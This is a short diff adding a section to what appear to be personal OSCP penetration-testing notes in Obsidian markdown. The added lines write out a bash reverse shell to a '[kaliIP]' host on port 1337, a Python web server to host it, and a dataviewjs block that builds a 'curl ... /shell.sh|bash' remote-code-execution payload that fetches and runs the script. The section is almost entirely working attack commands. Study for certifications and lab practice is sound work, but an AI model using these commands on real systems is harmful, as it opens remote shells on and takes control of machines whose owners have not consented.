@@ -93,6 +93,29 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 ---
 
+```
+vim shell.sh
+```
+
+```
+#!/bin/bash
+bash -i >& /dev/tcp/[kaliIP]/1337 0>&1
+```
+
+```
+python3 -m http.server 80
+```
+
+Cmd in RCE payload
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `curl+${KaliIP}:80/shell.sh|bash`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+---
 # 🎯 Step 3 — Stabilize the Shell
 
 Once connected:
